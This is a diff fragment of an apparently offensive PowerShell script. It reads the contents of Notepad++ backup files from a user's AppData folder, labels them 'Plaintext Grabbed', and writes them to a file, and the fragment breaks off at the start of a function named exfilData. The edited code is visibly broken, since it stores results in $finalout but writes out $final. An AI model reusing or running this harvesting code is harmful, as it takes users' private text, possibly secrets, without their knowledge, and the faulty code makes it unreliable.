@@ -6,18 +6,16 @@ $toread = "Notepad++\backup"
 $fullpath = Join-Path -Path $appdataroaming -ChildPath $toread
 $filelist = Get-ChildItem $fullpath\*@*
 
-function readFile {
-    ForEach ($filepath in $filelist){
-        $filename = $filepath.BaseName
+$finalout = ForEach ($filepath in $filelist)
+    {
         $filecontent = Get-Content -Path $filepath
-        "+-" *40
-        $finalcontent = "File name = $filename :: File contents = $filecontent"
-        "+-" *40
+        $out = @{
+            'Plaintext Grabbed from Notepad++ Backups' = $filecontent
+        }
+        New-Object -Type PSObject -Property $out
     }
-    return $finalcontent
-}
-
-$finalcontent > $FileName
+$final > $FileName
+    
 
 function exfilData {
     [CmdletBinding()]
